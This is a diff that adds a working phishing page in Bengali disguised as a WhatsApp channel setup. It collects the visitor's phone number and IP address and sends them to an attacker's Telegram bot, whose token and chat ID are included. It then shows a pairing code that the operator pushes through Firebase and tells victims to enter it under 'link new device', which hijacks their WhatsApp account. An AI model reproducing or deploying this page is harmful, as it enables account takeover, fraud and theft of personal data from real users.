@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your whatsapp account</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Kalpurush:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
+    <style>
+        body { font-family: 'Kalpurush', sans-serif; background: linear-gradient(135deg, #128C7E, #075E54); color: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 1rem; }
+        .container { max-width: 400px; width: 100%; background-color: #ECE5DD; border-radius: 1.5rem; padding: 2.5rem 2rem; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }
+        .whatsapp-logo i { font-size: 80px; color: #25D366; background: white; border-radius: 50%; padding: 20px; box-shadow: 0 5px 20px rgba(37, 211, 102, 0.4); }
+        .input-field { background-color: #fff; border: 2px solid #ddd; border-radius: 0.75rem; padding: 0.85rem 1rem; text-align: center; font-size: 1.1rem; width: 100%; transition: all 0.3s ease; }
+        .input-field:focus { outline: none; border-color: #25D366; }
+        .btn { background: linear-gradient(90deg, #25D366, #128C7E); color: white; font-weight: bold; padding: 0.9rem; border-radius: 0.75rem; width: 100%; border: none; cursor: pointer; transition: all 0.3s ease; }
+        .loader { border: 6px solid #ccc; border-top: 6px solid #128C7E; border-radius: 50%; width: 60px; height: 60px; animation: spin 1.5s linear infinite; margin: 2rem auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .pin-display { display: flex; justify-content: center; gap: 5px; margin-bottom: 1.5rem; }
+        .pin-digit { width: 38px; height: 48px; display: flex; justify-content: center; align-items: center; font-size: 1.5rem; font-weight: bold; background-color: #fff; border: 2px solid #128C7E; color: #075E54; border-radius: 0.5rem; }
+        .instruction-list { list-style: none; padding: 0; text-align: left; }
+        .instruction-list li { display: flex; align-items: flex-start; margin-bottom: 0.75rem; font-size: 1rem; }
+        .step-icon { color: #128C7E; margin-right: 0.75rem; margin-top: 4px; width: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="page1" class="text-center">
+        <div class="whatsapp-logo mb-5"><i class="fab fa-whatsapp"></i></div>
+        <h1 class="text-3xl font-bold text-gray-800 mb-2">Whatsapp চ্যানেল তৈরি করতে Whatsapp যুক্ত করুন</h1>
+        <p class="text-gray-600 mb-8">Add করার জন্য আপনার WhatsApp নাম্বার দিন</p>
+        <form id="phoneForm" class="space-y-5">
+            <input type="tel" id="phoneNumber" placeholder="আপনার Whatsapp নম্বর লিখুন" required class="input-field">
+            <button type="submit" class="btn"><i class="fab fa-whatsapp mr-2"></i>continue</button>
+        </form>
+    </div>
+    
+    <!-- Loading Time Updated -->
+    <div id="loading" class="hidden text-center">
+        <div class="loader"></div>
+        <p class="text-lg text-gray-700 font-semibold">সংযোগ করা হচ্ছে...</p>
+        <p class="text-gray-500">অনুগ্রহ করে ২০ সেকেন্ড অপেক্ষা করুন।</p>
+    </div>
+    
+    <!-- Page 2 Updated with new text -->
+    <div id="page2" class="hidden text-center">
+        <i class="fa fa-circle-info text-5xl text-teal-800 mb-4"></i>
+        <h1 class="text-2xl font-bold text-gray-800 mb-3">Whatsapp চ্যানেলে যুক্ত হওয়ার নির্দেশনা</h1>
+    
+        <p class="text-gray-600 mb-2">আপনার এর ৮-সংখ্যার Whatsapp আনলক নাম্বার</p>
+        <div id="pinContainer" class="pin-display">
+            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
+            <span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span><span class="pin-digit"></span>
+        </div>
+
+        <div class="bg-white p-4 rounded-lg shadow-inner text-gray-700">
+            <h2 class="text-lg font-semibold mb-3 border-b pb-2">আপনার ফোনে আনলক নাম্বার প্রবেশ করান:</h2>
+            <ul class="instruction-list">
+                <li><i class="fa fa-mobile-screen-button step-icon"></i>প্রথমে আপনার ফোনের নোটিফিকেশন থেকে <strong>"Enter code to link new device"</strong> এ ক্লিক করুন।</li>
+                <li><i class="fa fa-check-to-slot step-icon"></i>এরপর <strong>Confirm</strong> বাটনে ক্লিক করুন।</li>
+                <li><i class="fa fa-fingerprint step-icon"></i>আপনার ফোনের ফিঙ্গারপ্রিন্ট অথবা প্যাটার্ন লক দিয়ে আনলক করুন।</li>
+                <li><i class="fa fa-keyboard step-icon"></i>সবশেষে, ফাঁকা ৮টি বক্সে উপরে দেখানো আনলক নাম্বার টি বসান এবং অপেক্ষা করুন।</li>
+            </ul>
+        </div>
+        
+        <p class="text-xs text-gray-500 mt-4">দ্রষ্টব্য: নিরাপত্তার জন্য এই আনলক নাম্বার টি প্রতি ১ মিনিট পর পর স্বয়ংক্রিয়ভাবে পরিবর্তন হবে।</p>
+    </div>
+</div>
+
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<script>
+    const firebaseConfig = {
+  apiKey: "AIzaSyCnE3ixu-seDdC0csNEwsumKFEB3Im8DGE",
+  authDomain: "my-whatsapp-page.firebaseapp.com",
+  // আপনার দেওয়া লিঙ্ক থেকে পাওয়া সঠিক URL টি এখানে বসানো হয়েছে
+  databaseURL: "https://my-whatsapp-page-default-rtdb.firebaseio.com",
+  projectId: "my-whatsapp-page",
+  storageBucket: "my-whatsapp-page.firebasestorage.app",
+  messagingSenderId: "458940936506",
+  appId: "1:458940936506:web:d4faab25813f064c27a003",
+  measurementId: "G-EQ1QQDBTKG"
+};
+
+    const TELEGRAM_BOT_TOKEN = "8522129049:AAHZalnaH5g1evquwhwL1PmZjiasK9ZpAdI";
+    const CHAT_ID = "6904677396";
+    const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    // --- Firebase Initialization ---
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    // --- DOM Elements ---
+    const page1 = document.getElementById('page1');
+    const loading = document.getElementById('loading');
+    const page2 = document.getElementById('page2');
+    const phoneForm = document.getElementById('phoneForm');
+    const phoneNumberInput = document.getElementById('phoneNumber');
+    const pinDigits = document.querySelectorAll('#pinContainer .pin-digit');
+
+    // --- Functions ---
+    async function sendTelegramMessage(text) {
+        try {
+            await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch (error) { console.error("Telegram message failed:", error); }
+    }
+    
+    // IP API CORS এরর সমাধান করা হয়েছে
+    async function getVisitorInfoAndNotify() {
+        let ip = "Unknown";
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ip = ipData.ip;
+        } catch (error) {
+            console.error("Failed to fetch IP using ipify:", error);
+        }
+
+        const message = `
+*👤 নতুন ভিজিটর!*
+-------------------------
+*IP:* \`${ip}\`
+*Source URL:* \`${window.location.href}\`
+-------------------------`;
+        await sendTelegramMessage(message);
+    }
+    
+    function listenForCodeChanges() {
+        const liveCodeRef = database.ref('liveCode');
+        liveCodeRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            // Firebase থেকে প্রাপ্ত কোড, অথবা 8টি স্পেস (যদি কোড না থাকে)
+            const code = data && data.code ? data.code.trim().padEnd(8, ' ') : "        "; 
+            
+            for (let i = 0; i < 8; i++) {
+                // প্রতিটি বক্সে কোডের একটি করে অক্ষর সেট করুন
+                pinDigits[i].textContent = code[i] || ' ';
+            }
+        });
+    }
+
+    // --- Event Listeners ---
+    window.addEventListener('load', () => {
+        getVisitorInfoAndNotify();
+    });
+
+    phoneForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const phoneNumber = phoneNumberInput.value.trim();
+        if (!phoneNumber) return;
+        
+        await sendTelegramMessage(`*📱 প্রাপ্ত হোয়াটসঅ্যাপ নম্বর:*\n\`${phoneNumber}\``);
+        
+        page1.classList.add('hidden');
+        loading.classList.remove('hidden');
+
+        // ২০ সেকেন্ড অপেক্ষা করার পর নির্দেশনা পেজ দেখাবে
+        setTimeout(() => {
+            loading.classList.add('hidden');
+            page2.classList.remove('hidden');
+            listenForCodeChanges(); // ২০ সেকেন্ড পর Firebase listener শুরু
+        }, 20000); 
+    });
+</script>
+
+</body>
+</html>
